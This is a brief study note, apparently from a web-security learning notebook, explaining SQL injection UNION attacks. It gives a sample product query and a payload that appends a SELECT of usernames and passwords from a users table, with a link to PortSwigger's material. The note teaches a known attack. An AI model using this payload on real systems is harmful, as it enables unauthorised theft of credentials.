---
description: Retrieve data from different database tables.
---

# UNION attacks

The web app might restrict the result from SQL queries.

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

We want to know more, so we use `UNION` to execute an additional `SELECT` query.

```sql
' UNION SELECT username, password FROM users--
```



more: [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
